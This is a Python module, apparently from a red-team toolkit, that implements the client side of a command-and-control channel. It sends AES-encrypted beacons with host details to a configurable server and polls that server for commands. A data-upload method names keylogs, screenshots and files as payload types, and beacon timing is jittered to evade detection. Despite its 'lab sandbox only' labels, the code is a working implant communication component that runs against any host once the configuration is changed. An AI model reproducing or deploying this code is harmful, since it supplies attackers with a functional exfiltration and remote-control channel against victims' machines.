#!/usr/bin/env python3
"""
C2 Communication Module
Command and Control communication stub for red team testing

⚠️ LAB SANDBOX USE ONLY ⚠️
"""

import time
import json
import base64
import requests
from typing import Dict, Any, Optional, List
from datetime import datetime
from colorama import Fore, Style
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class C2Communication:
    """C2 communication stub for testing"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.enabled = config.get('c2_communication', {}).get('enabled', False)
        self.server_url = config.get('c2_communication', {}).get('server_url', 'http://localhost:8080/c2')
        self.encryption_enabled = config.get('c2_communication', {}).get('encryption', True)
        self.beacon_interval = config.get('c2_communication', {}).get('beacon_interval', 30)
        self.jitter = config.get('c2_communication', {}).get('jitter', 0.2)
        self.encryption_key = None
        
        if self.encryption_enabled:
            self._initialize_encryption()
    
    def _initialize_encryption(self):
        """Initialize encryption for C2 communication"""
        key_config = self.config.get('c2_communication', {}).get('encryption_key')
        
        if key_config:
            if isinstance(key_config, str):
                self.encryption_key = base64.b64decode(key_config)
            else:
                self.encryption_key = key_config
        else:
            # Generate new key
            self.encryption_key = get_random_bytes(32)
            print(f"{Fore.YELLOW}[!] Generated new C2 encryption key{Style.RESET_ALL}")
    
    def encrypt_data(self, data: bytes) -> Dict[str, str]:
        """Encrypt data for C2 communication"""
        if not self.encryption_enabled or not self.encryption_key:
            return {'data': base64.b64encode(data).decode('utf-8'), 'encrypted': False}
        
        iv = get_random_bytes(16)
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
        
        from Crypto.Util.Padding import pad
        padded_data = pad(data, AES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        
        return {
            'data': base64.b64encode(ciphertext).decode('utf-8'),
            'iv': base64.b64encode(iv).decode('utf-8'),
            'encrypted': True
        }
    
    def decrypt_data(self, encrypted_data: str, iv: str) -> bytes:
        """Decrypt data from C2 communication"""
        if not self.encryption_enabled or not self.encryption_key:
            return base64.b64decode(encrypted_data)
        
        ciphertext = base64.b64decode(encrypted_data)
        iv_bytes = base64.b64decode(iv)
        
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv_bytes)
        padded_plaintext = cipher.decrypt(ciphertext)
        
        from Crypto.Util.Padding import unpad
        return unpad(padded_plaintext, AES.block_size)
    
    def send_beacon(self, system_info: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Send beacon to C2 server
        
        Args:
            system_info: Optional system information to include
        
        Returns:
            Response from C2 server
        """
        if not self.enabled:
            print(f"{Fore.YELLOW}[!] C2 communication disabled - beacon not sent{Style.RESET_ALL}")
            return {'status': 'disabled'}
        
        # Prepare beacon data
        beacon_data = {
            'timestamp': datetime.now().isoformat(),
            'type': 'beacon',
            'system_info': system_info or self._get_system_info()
        }
        
        # Encrypt if enabled
        data_bytes = json.dumps(beacon_data).encode('utf-8')
        encrypted = self.encrypt_data(data_bytes)
        
        # Prepare POST request
        payload = {
            'beacon': encrypted['data'],
            'encrypted': encrypted['encrypted']
        }
        
        if encrypted['encrypted']:
            payload['iv'] = encrypted['iv']
        
        try:
            # Send HTTP POST request
            response = requests.post(
                self.server_url,
                json=payload,
                headers={'User-Agent': 'C2-Client/1.0'},
                timeout=10
            )
            
            result = {
                'status': 'success',
                'status_code': response.status_code,
                'response': response.text[:500] if response.text else None,
                'timestamp': datetime.now().isoformat()
            }
            
            print(f"{Fore.CYAN}[*] Beacon sent to C2 server:{Style.RESET_ALL}")
            print(f"  URL: {self.server_url}")
            print(f"  Status: {response.status_code}")
            print(f"{Fore.YELLOW}[!] LAB SANDBOX USE ONLY{Style.RESET_ALL}")
            
            return result
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] C2 beacon failed: {e}{Style.RESET_ALL}")
            return {
                'status': 'error',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def receive_command(self) -> Optional[Dict[str, Any]]:
        """
        Receive command from C2 server
        
        Returns:
            Command dictionary or None
        """
        if not self.enabled:
            return None
        
        try:
            # In real scenario, this would poll or maintain connection
            # For stub, we'll simulate a GET request
            response = requests.get(
                f"{self.server_url}/command",
                headers={'User-Agent': 'C2-Client/1.0'},
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                
                # Decrypt if needed
                if data.get('encrypted'):
                    command_data = self.decrypt_data(data['command'], data['iv'])
                    command = json.loads(command_data.decode('utf-8'))
                else:
                    command = data.get('command', {})
                
                return command
            
        except requests.exceptions.RequestException:
            pass
        
        return None
    
    def send_data(self, data: Dict[str, Any], data_type: str = 'data') -> Dict[str, Any]:
        """
        Send data to C2 server
        
        Args:
            data: Data dictionary to send
            data_type: Type of data (e.g., 'keylog', 'screenshot', 'file')
        
        Returns:
            Response from server
        """
        if not self.enabled:
            print(f"{Fore.YELLOW}[!] C2 communication disabled{Style.RESET_ALL}")
            return {'status': 'disabled'}
        
        payload_data = {
            'timestamp': datetime.now().isoformat(),
            'type': data_type,
            'data': data
        }
        
        data_bytes = json.dumps(payload_data).encode('utf-8')
        encrypted = self.encrypt_data(data_bytes)
        
        payload = {
            'data': encrypted['data'],
            'encrypted': encrypted['encrypted'],
            'data_type': data_type
        }
        
        if encrypted['encrypted']:
            payload['iv'] = encrypted['iv']
        
        try:
            response = requests.post(
                f"{self.server_url}/data",
                json=payload,
                headers={'User-Agent': 'C2-Client/1.0'},
                timeout=30
            )
            
            print(f"{Fore.CYAN}[*] Data sent to C2 server:{Style.RESET_ALL}")
            print(f"  Type: {data_type}")
            print(f"  Status: {response.status_code}")
            
            return {
                'status': 'success',
                'status_code': response.status_code,
                'response': response.text[:200] if response.text else None
            }
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] C2 data send failed: {e}{Style.RESET_ALL}")
            return {'status': 'error', 'error': str(e)}
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get basic system information"""
        import platform
        
        return {
            'platform': platform.system(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'python_version': platform.python_version()
        }
    
    def simulate_c2_session(self, duration: int = 60):
        """
        Simulate C2 communication session
        
        Args:
            duration: Duration in seconds
        """
        if not self.enabled:
            print(f"{Fore.YELLOW}[!] C2 communication disabled{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Simulating C2 session for {duration} seconds...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] LAB SANDBOX USE ONLY{Style.RESET_ALL}")
        
        start_time = time.time()
        beacon_count = 0
        
        while time.time() - start_time < duration:
            # Send beacon
            result = self.send_beacon()
            beacon_count += 1
            
            # Try to receive command
            command = self.receive_command()
            if command:
                print(f"{Fore.GREEN}[+] Received command: {command.get('type', 'unknown')}{Style.RESET_ALL}")
            
            # Wait for next beacon interval (with jitter)
            import random
            wait_time = self.beacon_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(min(wait_time, duration - (time.time() - start_time)))
        
        print(f"{Fore.GREEN}[+] C2 session complete - sent {beacon_count} beacons{Style.RESET_ALL}")

